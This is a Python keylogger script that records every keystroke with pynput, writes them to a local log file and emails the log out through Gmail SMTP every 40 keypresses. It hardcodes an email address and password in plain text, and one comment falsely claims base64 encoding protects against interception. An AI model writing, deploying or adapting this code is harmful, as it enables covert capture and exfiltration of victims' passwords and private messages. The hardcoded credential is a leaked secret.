from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import time
import os
from os import path


#the email credentials 
email_user = 'kb.mg.sg@gmail.com'
email_password = 'asljstudvgezwbzy'
email_send = 'kb.mg.sg@gmail.com'


def send_email():

    #writing the message for y\the mail 
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = 'the keylog after 2 hours '
    body = 'The log file after 10 seconds of logging the keystorkes'
    msg.attach(MIMEText(body,'plain'))

    #The filename and the path of the file to be attached in the mail
    filename=log_dir +"\\"+ "key_log.txt"
    #reading the file into bytes 
    attachment  =open(filename,'rb')

    #create an instance of MIMEBase with two parameters. 
    # First one is ‘_maintype’ amd the other one is ‘_subtype’.
    # This is the base class for all the MIME-specific sub-classes of Message.
    # Note that ‘_maintype’ is the Content-Type major type (e.g. text or image), 
    # and ‘_subtype’ is the Content-Type minor type (e.g. plain or gif or other media).
    part = MIMEBase('application','octet-stream')
    #encoding the file into base 64 to protect fo\rom wireshark attacks or MITM
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(email_user,email_password)

    server.sendmail(email_user,email_send,text)
    print("Email has been sent successfully ")
    server.quit()

dirpath = os.getcwd()
print(dirpath)
if(path.isdir(dirpath)):
    log_dir = dirpath
else:
    log_dir = dirpath

logging.basicConfig(filename=(log_dir +"\\"+"key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

i=1
def on_press(key):
    global i
    if i % 40 == 0:
        send_email()
    i=i+1
    logging.info(str(key))
        

with Listener(on_press=on_press) as listener:
    listener.join()
    




